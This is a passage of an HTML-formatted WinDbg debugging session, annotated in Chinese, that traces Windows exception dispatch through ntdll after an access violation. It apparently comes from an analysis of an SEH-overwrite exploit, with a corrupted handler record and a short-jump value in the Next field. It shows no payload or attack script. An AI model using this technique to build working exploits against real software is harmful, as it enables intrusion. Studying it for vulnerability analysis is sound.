class="number">00123430</span>  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line"><span class="number">00123440</span>  30001bdd <span class="number">00130000</span> 001234cc 1104c830</span><br><span class="line"><span class="number">00123450</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123460</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123470</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123480</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123490</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">001234a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00130000</span> <span class="number">00119000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_RECORD 001234cc</span><br><span class="line">ntdll!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : 0n-<span class="number">1073741819</span> &lt;---- <span class="number">16</span>进制补码(C0000005),EXCEPTION_INVALID_VIOLATION,读写内存违规</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : (null) </span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : <span class="number">0x30ed442c</span> Void &lt;---- 发生异常的指令地址</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 0012ffb0 </span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xa29706eb</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x30001bdd</span>     _EXCEPTION_DISPOSITION  +<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _CONTEXT 001234e8 </span><br><span class="line">ntdll!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : <span class="number">0x1003f</span></span><br><span class="line">   +<span class="number">0x004</span> <span class="built_in">Dr0</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x008</span> <span class="built_in">Dr1</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> <span class="built_in">Dr2</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x010</span> <span class="built_in">Dr3</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x014</span> Dr6              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x018</span> Dr7              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x090</span> SegFs            : <span class="number">0x3b</span></span><br><span class="line">   +<span class="number">0x094</span> SegEs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x098</span> SegDs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x09c</span> <span class="built_in">Edi</span>              : <span class="number">0x130000</span></span><br><span class="line">   +<span class="number">0x0a0</span> <span class="built_in">Esi</span>              : <span class="number">0x1104c830</span></span><br><span class="line">   +<span class="number">0x0a4</span> <span class="built_in">Ebx</span>              : <span class="number">0x5000000</span></span><br><span class="line">   +<span class="number">0x0a8</span> <span class="built_in">Edx</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> <span class="built_in">Ecx</span>              : <span class="number">0x22</span></span><br><span class="line">   +<span class="number">0x0b0</span> <span class="built_in">Eax</span>              : <span class="number">0xc8ac</span></span><br><span class="line">   +<span class="number">0x0b4</span> <span class="built_in">Ebp</span>              : <span class="number">0x1237ec</span></span><br><span class="line">   +<span class="number">0x0b8</span> <span class="built_in">Eip</span>              : <span class="number">0x30ed442c</span></span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : <span class="number">0x10206</span></span><br><span class="line">   +<span class="number">0x0c4</span> <span class="built_in">Esp</span>              : <span class="number">0x1237b4</span></span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>]  <span class="string">"???"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> 001234a0</span><br><span class="line">001234a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00130000</span> <span class="number">00119000</span></span><br><span class="line">001234b0  <span class="number">00000000</span> 001237ec 7c92e46a <span class="number">00000000</span></span><br><span class="line">001234c0  001234e8 001234cc 001234e8 c0000005</span><br><span class="line">001234d0  <span class="number">00000000</span> <span class="number">00000000</span> 30ed442c <span class="number">00000002</span></span><br><span class="line">001234e0  <span class="number">00000001</span> <span class="number">00130000</span> 0001003f <span class="number">00000000</span></span><br><span class="line">001234f0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123500</span>  <span class="number">00000000</span> ffff037f ffff0000 ffffffff</span><br><span class="line"><span class="number">00123510</span>  30d582a7 <span class="number">00000000</span> <span class="number">00000000</span> ffff0000</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c92e4f4 <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923247 <span class="built_in">esp</span>=0012342c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!RtlpExecuteHandlerForException:</span><br><span class="line">7c923247 babc32927c      <span class="keyword">mov</span>     <span class="built_in">edx</span>,offset ntdll!ExecuteHandler2+<span class="number">0x3a</span> (7c9232bc) &lt;---- ExecuteHandler2中安装的SEH记录的回调函数地址</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92324c <span class="built_in">esp</span>=0012342c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!RtlpExecuteHandlerForException+<span class="number">0x5</span>:</span><br><span class="line">7c92324c eb08            <span class="keyword">jmp</span>     ntdll!ExecuteHandler (7c923256)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line">Breakpoint <span class="number">3</span> hit</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923256 <span class="built_in">esp</span>=0012342c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler:</span><br><span class="line">7c923256 <span class="number">53</span>              <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">0012342c  7c94a9ef 001234cc 0012ffb0 001234e8</span><br><span class="line">0012343c  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line">0012344c  1104c830 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012345c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012346c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012347c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012348c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012349c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00130000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923257 <span class="built_in">esp</span>=<span class="number">00123428</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x1</span>:</span><br><span class="line">7c923257 <span class="number">56</span>              <span class="keyword">push</span>    <span class="built_in">esi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923258 <span class="built_in">esp</span>=<span class="number">00123424</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x2</span>:</span><br><span class="line">7c923258 <span class="number">57</span>              <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001234a0 <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923259 <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x3</span>:</span><br><span class="line">7c923259 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line"><span class="number">00123420</span>  <span class="number">00130000</span> 001234cc 0012ffb0 7c94a9ef</span><br><span class="line"><span class="number">00123430</span>  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line"><span class="number">00123440</span>  30001bdd <span class="number">00130000</span> 001234cc 1104c830</span><br><span class="line"><span class="number">00123450</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123460</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123470</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123480</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">00123490</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=0012ffb0 <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92325b <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x5</span>:</span><br><span class="line">7c92325b 33<span class="built_in">db</span>            <span class="keyword">xor</span>     <span class="built_in">ebx</span>,<span class="built_in">ebx</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=001234cc <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92325d <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x7</span>:</span><br><span class="line">7c92325d 33f6            <span class="keyword">xor</span>     <span class="built_in">esi</span>,<span class="built_in">esi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00130000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92325f <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x9</span>:</span><br><span class="line">7c92325f 33ff            <span class="keyword">xor</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923261 <span class="built_in">esp</span>=<span class="number">00123420</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0xb</span>:</span><br><span class="line">7c923261 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123440</span>=30001bdd</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923265 <span class="built_in">esp</span>=0012341c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0xf</span>:</span><br><span class="line">7c923265 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:0012343c=001234a0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923269 <span class="built_in">esp</span>=<span class="number">00123418</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x13</span>:</span><br><span class="line">7c923269 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123438</span>=001234e8</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c92326d <span class="built_in">esp</span>=<span class="number">00123414</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x17</span>:</span><br><span class="line">7c92326d ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123434</span>=0012ffb0</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923271 <span class="built_in">esp</span>=<span class="number">00123410</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x1b</span>:</span><br><span class="line">7c923271 ff742420        <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">20h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:<span class="number">00123430</span>=001234cc</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line">Breakpoint <span class="number">4</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923275 <span class="built_in">esp</span>=0012340c <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler+<span class="number">0x1f</span>:</span><br><span class="line">7c923275 e808000000      <span class="keyword">call</span>    ntdll!ExecuteHandler2 (7c923282)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">0012340c  001234cc 0012ffb0 001234e8 001234a0</span><br><span class="line">0012341c  30001bdd <span class="number">00130000</span> 001234cc 0012ffb0</span><br><span class="line">0012342c  7c94a9ef 001234cc 0012ffb0 001234e8</span><br><span class="line">0012343c  001234a0 30001bdd <span class="number">00130000</span> 001234cc</span><br><span class="line">0012344c  1104c830 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012345c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012346c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">0012347c  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923282 <span class="built_in">esp</span>=<span class="number">00123408</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2:</span><br><span class="line">7c923282 <span class="number">55</span>              <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923283 <span class="built_in">esp</span>=<span class="number">00123404</span> <span class="built_in">ebp</span>=001234b4 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x1</span>:</span><br><span class="line">7c923283 8bec            <span class="keyword">mov</span>     <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=0000e085 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=7c923285 <span class="built_in">esp</span>=<span class="number">00123404</span> <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">ntdll!ExecuteHandler2+<span class="number">0x3</span>:</span><br><span class="line">7c923285 ff750c          <span class="keyword">push</span>    <span class="built_in">dword</span> <span 